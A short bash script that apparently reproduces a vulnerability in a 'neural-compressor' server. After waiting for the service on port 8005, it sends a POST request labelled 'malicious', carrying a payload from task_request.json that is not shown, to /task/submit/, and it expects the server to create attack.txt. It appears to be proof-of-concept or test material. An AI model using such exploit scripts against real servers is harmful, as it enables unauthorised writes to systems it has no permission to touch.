#!/bin/bash

# Setup
if ! command -v curl &> /dev/null; then
    echo "Installing curl..."
    apt update && apt install -y -V curl
fi

IS_CI_RUN=$1
HOSTNAME='localhost'

if [ "$IS_CI_RUN" = true ]; then
   HOSTNAME='neural-compressor'
fi

URL="http://${HOSTNAME}:8005"

# Wait for server to start

echo "Waiting for server at $URL..."
RETRIES=3
DELAY=5

curl --max-time 2 --retry $RETRIES --retry-connrefused $URL || { echo "Server did not become ready in time"; exit 56; }

# echo "Server ready at $URL"

# Enact the exploit

echo "Sending malicious curl request..."

curl -X POST -H "Content-Type: application/json" --connect-timeout 5 --data @./task_request.json ${URL}/task/submit/
echo "File should be created on the server at /persistent/ns_workspace/task_workspace/attack.txt"

echo "Malicious request sent"